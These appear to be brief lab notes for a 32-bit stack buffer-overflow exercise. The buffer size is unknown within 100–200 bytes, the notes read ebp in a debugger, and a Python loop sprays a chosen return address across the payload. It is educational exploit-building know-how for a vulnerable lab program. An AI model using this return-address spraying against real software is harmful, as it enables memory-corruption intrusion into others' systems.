Assumptions: (1) Do not know the buffer size, but buffer range is 100-200, 
             (2) can debug the vulnerable program
1. Assume buffer size [LB, UB], RA - &buffer <= UB + 4, assume S bytes
2. Spray the first S bytes with a chosen ret
3. Debug to find the debugged ebp address
p $ebp = 0xffffca18
ret = $ebp + 256 (add a multiple of 4, result in a number does not contain 0)
        
S = 200 + 12            
L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
for i in range(0,S,L):
  content[i:i+L] = (ret).to_bytes(L,byteorder='little')
